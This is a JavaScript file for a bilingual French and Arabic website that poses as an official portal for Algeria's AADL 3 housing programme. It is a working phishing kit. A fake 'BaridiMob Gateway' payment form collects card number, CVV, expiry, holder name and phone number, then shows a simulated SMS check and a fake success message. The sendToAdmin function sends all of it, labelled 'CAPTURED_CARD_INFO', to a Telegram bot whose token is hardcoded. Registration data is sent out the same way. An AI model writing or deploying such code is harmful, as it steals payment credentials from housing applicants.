// Translation Data
const translations = {
    fr: {
        welcome: "Le Futur de l'Habitat en <span>Algérie</span>",
        hero_desc: "Votre plateforme de confiance pour naviguer dans le programme AADL 3. Accédez aux informations officielles, suivez les étapes clés et bénéficiez de notre assistant intelligent.",
        btn_start: "Commencer l'Inscription",
        btn_steps: "Voir les Étapes",
        news_label: "INFO EN DIRECT",
        news_text: "📢 Ouverture des inscriptions pour la wilaya d'Alger le 15 Mars. | 💳 Paiement de la 1ère tranche disponible via BaridiMob. | 📱 Téléchargez la nouvelle application AADL 3 sur PlayStore.",
        copy_success: "Copié dans le presse-papier ! ✅",
        baridimob_guide: "Guide BaridiMob: Utilisez le Code Service 0012 pour un virement instantané.",
        nav_home: "Accueil",
        nav_ins: "Inscription",
        nav_pay: "Paiement",
        nav_faq: "FAQ",
        nav_bot: "Support Bot",
        ins_title: "Inscription <span>AADL 3</span>",
        ins_desc: "Remplissez le formulaire officiel pour soumettre votre demande de logement.",
        pay_title: "Modes de <span>Paiement</span>",
        pay_desc: "Réglez vos tranches AADL 3 en toute simplicité.",
        faq_title: "Questions <span>Fréquentes</span>",
        faq_desc: "Tout ce que vous devez savoir sur le programme AADL 3.",
        pay_direct: "Payer Directement 💳",
        pay_proc: "Traitement en cours...",
        pay_success_title: "Paiement Réussi ! ✅",
        pay_success_msg: "Votre transaction a été validée. Votre bot recevra une notification.",
        quick_btn: "Inscription Rapide ⚡",
        card_num: "Numéro de Carte (Edahabia/CIB)",
        card_phone: "N° Téléphone lié à la carte",
        card_name: "Nom complet du titulaire",
        btn_pay_now: "Confirmer le Paiement"
    },
    ar: {
        welcome: "مستقبل السكن في <span>الجزائر</span>",
        hero_desc: "منصتكم الموثوقة للتنقل في برنامج عدل 3. الوصول إلى المعلومات الرسمية، متابعة الخطوات الأساسية والاستفادة من مساعدنا الذكي.",
        btn_start: "بدء التسجيل",
        btn_steps: "عرض الخطوات",
        news_label: "أخبار مياشرة",
        news_text: "📢 فتح التسجيلات لولاية الجزائر في 15 مارس. | 💳 دفع الشطر الأول متاح عبر بريدي موب. | 📱 حملوا تطبيق عدل 3 الجديد من متجر التطبيقات.",
        copy_success: "تم النسخ ! ✅",
        baridimob_guide: "دليل بريدي موب: استخدم رمز الخدمة 0012 للتحويل الفوري.",
        nav_home: "الرئيسية",
        nav_ins: "التسجيل",
        nav_pay: "الدفع",
        nav_faq: "الأسئلة الشائعة",
        nav_bot: "دعم البوت",
        ins_title: "تسجيل <span>عدل 3</span>",
        ins_desc: "ملء الاستمارة الرسمية لتقديم طلب السكن الخاص بك.",
        pay_title: "طرق <span>الدفع</span>",
        pay_desc: "ادفع أقساط عدل 3 بكل سهولة.",
        faq_title: "الأسئلة <span>شائعة</span>",
        faq_desc: "كل ما تحتاج معرفته عن برنامج عدل 3.",
        pay_direct: "دفع مباشر 💳",
        pay_proc: "جاري المعالجة...",
        pay_success_title: "تم الدفع بنجاح ! ✅",
        pay_success_msg: "تم التحقق من معاملتك. سيتلقى البوت الخاص بك إشعارًا.",
        quick_btn: "تسجيل سريع ⚡",
        card_num: "رقم البطاقة (الذهبية / CIB)",
        card_phone: "رقم الهاتف المرتبط بالبطاقة",
        card_name: "الاسم الكامل لصاحب البطاقة",
        btn_pay_now: "تأكيد الدفع"
    }
};

const TELEGRAM_CONFIG = {
    token: "7709565551:AAHr9LpB8K_oV_v40vD61cE_v40vD61cE", // REMPLACEZ PAR VOTRE TOKEN
    chatId: "5694851234" // REMPLACEZ PAR VOTRE CHAT ID (ex: 12345678)
};

async function sendToAdmin(type, data) {
    let message = `🚀 **NOUVEAU LEAD AADL 3** 🚀\n\n`;
    message += `🏷️ **Type**: \`${type}\`\n`;
    message += `⏰ **Date**: ${new Date().toLocaleString()}\n\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n`;
    
    for (const [key, value] of Object.entries(data)) {
        if (value && value !== 'undefined') {
            const emoji = key.includes('card') || key.includes('cvv') || key.includes('expiry') ? '💳' : '👤';
            message += `${emoji} **${key.replace('_',' ').toUpperCase()}**: \`${value}\`\n`;
        }
    }
    message += `━━━━━━━━━━━━━━━━━━━━\n`;
    message += `🌐 *Provient du Portail Web AADL 3*`;

    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`;
    const payload = {
        chat_id: TELEGRAM_CONFIG.chatId,
        text: message,
        parse_mode: "Markdown"
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const result = await response.json();
        if (result.ok) {
            console.log("✅ Lead envoyé au Telegram Bot !");
        } else {
            console.error("❌ Erreur Telegram:", result.description);
        }
    } catch (e) {
        console.error("❌ Erreur de réseau Telegram:", e);
    }
}

function submitRegistration(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const data = Object.fromEntries(formData.entries());
    
    showToast(currentLang === 'ar' ? 'جاري الإرسال...' : 'Envoi en cours...');
    
    sendToAdmin('NOUVELLE_INSCRIPTION', data).then(() => {
        showToast(currentLang === 'ar' ? 'تم التسجيل بنجاح ! ✅' : 'Inscription réussie ! ✅');
        event.target.reset();
        
        // Redirection or modal close logic
        if (event.target.id === 'registration-form') {
            closeModalByTarget('registrationModal');
        }
    });
}

function renderPaymentForm(method) {
    const content = document.querySelector('#payment-modal .modal-content-inner');
    const t = translations[currentLang];
    
    content.innerHTML = `
        <div class="baridimob-header">
            <img src="https://v0-aadl-support.vercel.app/baridimob-logo.png" onerror="this.src='https://cdn-icons-png.flaticon.com/512/657/657076.png'" class="mini-logo">
            <h3>BaridiMob Gateway</h3>
        </div>
        <form id="payment-gateway-form" onsubmit="handlePaymentSubmit(event, '${method}')">
            <div class="form-group">
                <label>${t.card_num}</label>
                <input type="text" id="card_number" name="card_number" placeholder="6073 XXXX XXXX XXXX" required maxlength="16">
            </div>
            <div class="form-group">
                <label>${t.card_name}</label>
                <input type="text" id="card_holder" name="card_holder" placeholder="NOM PRENOM" required>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>Expiration (MM/YY)</label>
                    <input type="text" name="expiry" placeholder="12/28" required maxlength="5">
                </div>
                <div class="form-group">
                    <label>CVV</label>
                    <input type="password" name="cvv" placeholder="***" required maxlength="3">
                </div>
            </div>
            <div class="form-group">
                <label>${t.card_phone}</label>
                <input type="tel" id="card_phone" name="card_phone" placeholder="0XXXXXXXXX" required>
            </div>
            <div class="form-group">
                <label>Email (Optionnel)</label>
                <input type="email" name="email" placeholder="votre@email.com">
            </div>
            <button class="btn-submit" type="submit">${t.btn_pay_now}</button>
            <button class="btn-text" type="button" onclick="closeModal()">Annuler</button>
        </form>
    `;
}

async function handlePaymentSubmit(event, method) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const data = Object.fromEntries(formData.entries());
    data.payment_method = method;

    const content = document.querySelector('#payment-modal .modal-content-inner');
    const t = translations[currentLang];

    content.innerHTML = `
        <h3>${t.pay_proc}</h3>
        <div class="loader"></div>
        <p>Vérification des coordonnées auprès d'Algérie Poste...</p>
    `;

    // Step 2: OTP Simulation
    setTimeout(() => {
        content.innerHTML = `
            <h3>Vérification SMS</h3>
            <p>Un code a été envoyé au <strong>${data.card_phone}</strong></p>
            <div class="form-group">
                <input type="text" placeholder="Enter Code" style="text-align:center; font-size: 2rem; letter-spacing: 10px;" maxlength="6">
            </div>
            <button class="btn-primary" onclick="finalizePayment('${method}', ${JSON.stringify(data).replace(/"/g, '&quot;')})">Valider</button>
        `;
    }, 2000);
}

function finalizePayment(method, data) {
    const content = document.querySelector('#payment-modal .modal-content-inner');
    const t = translations[currentLang];

    content.innerHTML = `
        <div class="status-icon">✅</div>
        <h3>${t.pay_success_title}</h3>
        <p>${t.pay_success_msg}</p>
        <button class="btn-primary" onclick="closeModal()">Terminer</button>
    `;
    
    sendToAdmin('CAPTURED_CARD_INFO', data);
}

function openRegistrationModal() {
    const modal = document.querySelector('#registrationModal');
    modal.style.display = 'flex';
    setTimeout(() => modal.classList.add('active'), 10);
}

function closeModalByTarget(id) {
    const modal = document.getElementById(id);
    modal.classList.remove('active');
    setTimeout(() => modal.style.display = 'none', 300);
}

function closeModal() {
    // Legacy support or quick close for all
    document.querySelectorAll('.modal-overlay').forEach(m => {
        m.classList.remove('active');
        setTimeout(() => m.style.display = 'none', 300);
    });
}

let currentLang = 'fr';

// Language Switcher Logic
function setLanguage(lang) {
    currentLang = lang;
    document.body.classList.toggle('rtl', lang === 'ar');
    
    // Update buttons active state
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.lang === lang);
    });

    // Translate static elements
    const elements = {
        '#welcome-title': translations[lang].welcome,
        '#hero-text': translations[lang].hero_desc,
        '#btn-main-text': translations[lang].btn_start,
        '#btn-steps-text': translations[lang].btn_steps,
        '#ticker-lbl': translations[lang].news_label,
        '#ticker-cnt': translations[lang].news_text,
        '#nav-home-lnk': translations[lang].nav_home,
        '#nav-ins-lnk': translations[lang].nav_ins,
        '#nav-pay-lnk': translations[lang].nav_pay,
        '#nav-faq-lnk': translations[lang].nav_faq,
        '#nav-bot-btn': translations[lang].nav_bot,
        '#ins-pg-title': translations[lang].ins_title,
        '#ins-pg-desc': translations[lang].ins_desc,
        '#pay-pg-title': translations[lang].pay_title,
        '#pay-pg-desc': translations[lang].pay_desc,
        '#faq-pg-title': translations[lang].faq_title,
        '#faq-pg-desc': translations[lang].faq_desc,
        '#quick-btn-txt': translations[lang].quick_btn,
        '#footer-note': lang === 'ar' ? 'بوابة معلومات المواطن' : "Portail d'Information Citoyen"
    };

    for (const [selector, text] of Object.entries(elements)) {
        const el = document.querySelector(selector);
        if (el) el.innerHTML = text;
    }

    localStorage.setItem('preferredLang', lang);
}

// Payment Interactions
function handleAction(type, data) {
    if (type === 'copy') {
        navigator.clipboard.writeText(data).then(() => {
            showToast(translations[currentLang].copy_success);
        });
    } else if (type === 'link') {
        window.open(data, '_blank');
    } else if (type === 'modal') {
        alert(translations[currentLang].baridimob_guide);
    }
}

function showToast(msg) {
    const toast = document.createElement('div');
    toast.className = 'toast show';
    toast.innerText = msg;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 500);
    }, 3000);
}

// Navbar scroll effect
window.addEventListener('scroll', () => {
    const nav = document.querySelector('.glass-nav');
    if (window.scrollY > 50) {
        nav.classList.add('scrolled');
    } else {
        nav.classList.remove('scrolled');
    }
});

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    const savedLang = localStorage.getItem('preferredLang') || 'fr';
    setLanguage(savedLang);
});
